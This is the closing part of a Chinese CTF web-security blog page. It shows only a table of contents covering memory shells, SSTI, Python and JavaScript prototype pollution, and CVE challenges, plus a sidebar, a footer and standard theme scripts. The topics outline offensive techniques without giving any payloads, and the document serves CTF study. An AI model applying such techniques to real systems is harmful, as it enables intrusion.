class="toc-text">什么是内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-8"><span class="toc-number">1.22.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask%E4%B8%8B%E5%BA%94%E7%94%A8"><span class="toc-number">1.22.3.</span> <span class="toc-text">Flask下应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99"><span class="toc-number">1.22.3.1.</span> <span class="toc-text">Debug模式下利用报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9EDebug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.22.3.2.</span> <span class="toc-text">非Debug模式下利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="toc-number">1.22.4.</span> <span class="toc-text">无回显SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83-%E8%A5%BF%E7%94%B5-CTF-%E7%BB%88%E7%AB%AF-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">1.22.4.1.</span> <span class="toc-text">训练 - 西电 CTF 终端 第二十二章 血海核心·千年手段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.23.</span> <span class="toc-text">原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-9"><span class="toc-number">1.23.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.23.1.1.</span> <span class="toc-text">Python原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90%EF%BC%88%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90%EF%BC%89"><span class="toc-number">1.23.1.1.1.</span> <span class="toc-text">污染分析（经典例子）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">1.23.1.1.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.23.1.1.2.1.</span> <span class="toc-text">获取全局变量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.23.1.1.2.2.</span> <span class="toc-text">sys模块加载</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8loader%E8%8E%B7%E5%8F%96"><span class="toc-number">1.23.1.1.2.3.</span> <span class="toc-text">加载器loader获取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.23.1.1.2.4.</span> <span class="toc-text">形参默认值替换</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#got-first-request%EF%BC%9A"><span class="toc-number">1.23.1.1.2.5.</span> <span class="toc-text">_got_first_request：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#static-url-path"><span class="toc-number">1.23.1.1.2.6.</span> <span class="toc-text">_static_url_path:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#os-path-pardir"><span class="toc-number">1.23.1.1.2.7.</span> <span class="toc-text">os.path.pardir:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.23.1.2.</span> <span class="toc-text">JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-proto-%E8%AE%BF%E9%97%AE"><span class="toc-number">1.23.1.2.1.</span> <span class="toc-text">利用__proto__访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1"><span class="toc-number">1.23.1.2.2.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Json%E8%BE%93%E5%85%A5%E9%80%A0%E6%88%90%E6%B1%A1%E6%9F%93"><span class="toc-number">1.23.1.2.3.</span> <span class="toc-text">Json输入造成污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E4%BA%86-proto-%E7%9A%84%E6%B1%A1%E6%9F%93"><span class="toc-number">1.23.1.2.4.</span> <span class="toc-text">绕过过滤了__proto__的污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PS"><span class="toc-number">1.23.1.2.5.</span> <span class="toc-text">PS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-5"><span class="toc-number">1.23.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NCTF2024-ez-dash"><span class="toc-number">1.23.2.1.</span> <span class="toc-text">NCTF2024 ez_dash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mini-L-CTF-2025-%E8%A5%BF%E7%94%B5-CTF-%E7%BB%88%E7%AB%AF-Clickclick"><span class="toc-number">1.23.2.2.</span> <span class="toc-text">Mini L-CTF 2025 - 西电 CTF 终端 Clickclick</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-OtenkiGirl"><span class="toc-number">1.23.2.3.</span> <span class="toc-text">BUUCTF在线评测 OtenkiGirl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E5%A4%9A%E9%87%8D%E5%AE%87%E5%AE%99%E6%97%A5%E8%AE%B0-NSSCTF"><span class="toc-number">1.23.2.4.</span> <span class="toc-text">[LitCTF 2025]多重宇宙日记 | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-EzFlask"><span class="toc-number">1.23.2.5.</span> <span class="toc-text">BUUCTF在线评测 EzFlask</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE%E8%AF%B4%E6%98%AF"><span class="toc-number">1.24.</span> <span class="toc-text">CVE说是</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2025-nest-js-NSSCTF"><span class="toc-number">1.24.1.</span> <span class="toc-text">LitCTF 2025]nest_js | NSSCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-3-CTF-2025-d3model"><span class="toc-number">1.24.2.</span> <span class="toc-text">D^3 CTF 2025 d3model</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CAT"><span class="toc-number">1.24.3.</span> <span class="toc-text">攻防世界 CAT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%BE%E5%A3%B0"><span class="toc-number">1.25.</span> <span class="toc-text">尾声</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/13/AI%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB/" title="AI数据投毒">AI数据投毒</a><time datetime="2025-11-13T09:45:57.000Z" title="发表于 2025-11-13 17:45:57">2025-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/22/Pytorch/" title="Pytorch">Pytorch</a><time datetime="2025-10-22T10:49:46.000Z" title="发表于 2025-10-22 18:49:46">2025-10-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/12/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025Web-1345/" title="羊城杯2025Web 1345">羊城杯2025Web 1345</a><time datetime="2025-10-12T04:56:13.000Z" title="发表于 2025-10-12 12:56:13">2025-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/10/timeit-repeat%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="timeit.repeat代码执行">timeit.repeat代码执行</a><time datetime="2025-10-10T13:34:21.000Z" title="发表于 2025-10-10 21:34:21">2025-10-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFWeb-Wp/" title="2025湾区杯Web Wp">2025湾区杯Web Wp</a><time datetime="2025-09-08T07:17:51.000Z" title="发表于 2025-09-08 15:17:51">2025-09-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Pure Stream</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="CTF,Web,miHoYo,PureStream,Marblue" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>